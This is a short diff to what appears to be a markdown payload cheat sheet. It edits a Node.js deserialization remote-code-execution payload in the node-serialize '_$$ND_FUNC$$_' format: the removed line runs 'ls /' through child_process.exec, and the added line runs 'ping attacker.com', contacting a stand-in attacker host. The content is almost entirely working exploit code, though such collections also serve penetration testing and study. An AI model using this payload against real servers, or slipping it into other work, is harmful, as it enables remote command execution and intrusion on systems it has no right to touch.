@@ -1089,7 +1089,7 @@ while stop == False:
 ### Node.js deserialization vulnerability payload [RCE]
 
 ```js
-{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',function(error, stdout, stderr) { console.log(stdout) });\n }()"}
+{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ping attacker.com',function(error, stdout, stderr) { console.log(stdout) });}()"}
 ```
 ### Modifying serialized data types
 ```js
